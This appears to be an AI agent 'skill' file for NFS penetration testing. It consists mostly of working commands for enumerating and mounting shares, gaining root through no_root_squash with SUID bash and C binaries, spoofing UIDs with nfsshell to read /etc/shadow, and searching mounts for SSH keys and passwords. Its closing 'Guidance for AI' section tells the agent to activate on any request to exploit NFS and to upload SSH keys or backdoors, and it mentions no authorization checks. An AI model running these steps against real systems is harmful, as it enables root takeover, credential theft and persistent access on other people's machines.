# NFS Pentesting Skill

## Goal

Enumerate and exploit NFS (Network File System) shares to access sensitive files, extract credentials, and potentially gain root access.

## Methodology

1. **Discovery**: Identify NFS services and available exports
2. **Enumeration**: List exported shares and permissions
3. **Mounting**: Mount accessible shares
4. **File Analysis**: Search for sensitive data and credentials
5. **Privilege Escalation**: Exploit no_root_squash or SUID binaries

## Tools

* **showmount**: List NFS exports
* **mount**: Mount NFS shares
* **nmap**: NFS scripts
* **nfsshell**: NFS exploitation shell

## Example Commands

```bash
# Nmap NFS enumeration
nmap -p111,2049 --script nfs-* target
nmap -p111 --script rpcinfo target

# List exported shares
showmount -e target
showmount -a target

# RPC info
rpcinfo -p target

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs target:/share /mnt/nfs
mount -t nfs -o vers=2 target:/share /mnt/nfs  # Force NFSv2
mount -t nfs -o vers=3 target:/share /mnt/nfs  # Force NFSv3
mount -t nfs -o nfsvers=4 target:/share /mnt/nfs  # NFSv4

# Mount with specific options
mount -t nfs -o nolock target:/share /mnt/nfs

# List mounted shares
df -h
mount | grep nfs
```

## NFS Enumeration

```bash
# Detailed showmount
showmount -e target
# Example output:
# /share     (everyone)
# /home      192.168.1.0/24
# /backup    192.168.1.100

# Nmap scripts
nmap -sV -p111 --script=rpcinfo target
nmap -p2049 --script=nfs-ls,nfs-showmount,nfs-statfs target

# RPC enumeration
rpcinfo -p target
rpcclient -U "" target
```

## Privilege Escalation via no_root_squash

```bash
# If share is exported with no_root_squash:
# Root on client = root on server

# Check exports on server (/etc/exports)
# /share *(rw,no_root_squash)

# Mount as root
mount -t nfs target:/share /mnt/nfs

# Create SUID bash
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target (as normal user):
/mnt/nfs/bash -p
# Now you have root shell!

# Alternative: Create SUID C program
cat > /mnt/nfs/suid.c << EOF
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc /mnt/nfs/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid

# On target:
./suid
```

## Bypassing IP-Based Access Control

```bash
# If NFS restricts by IP, try:

# 1. If you're on the subnet, just mount
mount -t nfs target:/share /mnt/nfs

# 2. Spoof source IP (requires root and favorable network position)
# Not practical in most scenarios

# 3. Pivot through allowed host
# If you compromise an allowed host, mount from there
```

## NFSv4 Specific

```bash
# NFSv4 shows root (/) instead of individual exports
showmount -e target
# May show "/" for NFSv4

# Mount NFSv4 root
mount -t nfs4 target:/ /mnt/nfs

# Then browse to find actual shares
ls /mnt/nfs

# NFSv4 ID mapping
# If usernames don't match, create matching users
# Or set sec=sys for old-style UID/GID mapping
```

## UID/GID Exploitation

```bash
# NFS uses UID/GID for access control
# If you can create a user with same UID as privileged user...

# Check UID of files in share
ls -ln /mnt/nfs

# Create local user with matching UID
useradd -u 1001 fakeuser

# Or use nfsshell to specify UID
$ nfsshell
nfs> host target
nfs> export
nfs> mount /share
nfs> uid 0
nfs> gid 0
nfs> ls
nfs> cat /etc/shadow
```

## Interesting Files to Look For

```bash
# After mounting NFS share, search for:

# SSH keys
find /mnt/nfs -name "id_rsa" 2>/dev/null
find /mnt/nfs -name "authorized_keys" 2>/dev/null
find /mnt/nfs -name ".ssh" 2>/dev/null

# Credentials
grep -r "password" /mnt/nfs 2>/dev/null
find /mnt/nfs -name "*.conf" -exec grep -l "pass" {} \;
find /mnt/nfs -name ".bash_history" 2>/dev/null

# Backup files
find /mnt/nfs -name "*.bak" -o -name "*.backup" 2>/dev/null

# Database files
find /mnt/nfs -name "*.sql" -o -name "*.db" 2>/dev/null

# Configuration files
cat /mnt/nfs/etc/shadow 2>/dev/null
cat /mnt/nfs/etc/passwd 2>/dev/null
```

## Metasploit Modules

```bash
# NFS enumeration
use auxiliary/scanner/nfs/nfsmount

# List exports
use auxiliary/scanner/nfs/mount_list
```

## NFS Export Options Reference

| Option | Description | Security Impact |
|--------|-------------|-----------------|
| rw | Read-write access | Allows modification |
| ro | Read-only access | Safer |
| no_root_squash | Root keeps root privileges | **Critical - allows root access** |
| root_squash | Root mapped to nobody | Default, safer |
| all_squash | All users mapped to nobody | Most restrictive |
| anonuid/anongid | Specify anonymous UID/GID | |
| sync | Synchronous writes | |
| no_subtree_check | Improves reliability | |

## Guidance for AI

* Activate this skill when user wants to enumerate or exploit NFS shares
* **Check for no_root_squash first** - if present, easy root escalation
* NFS commonly runs on:
  - Port 111 (rpcbind/portmapper)
  - Port 2049 (NFS)
* Always enumerate ALL exported shares with `showmount -e`
* After mounting, check file UIDs with `ls -ln` - may be able to impersonate users
* Home directories often contain SSH keys, config files, bash history
* NFS is stateless - credentials are based on UID/GID, not username
* NFSv4 has better security but is often misconfigured
* If access is denied, try forcing different NFS versions (vers=2,3,4)
* Look for writable shares to upload SSH keys or backdoors
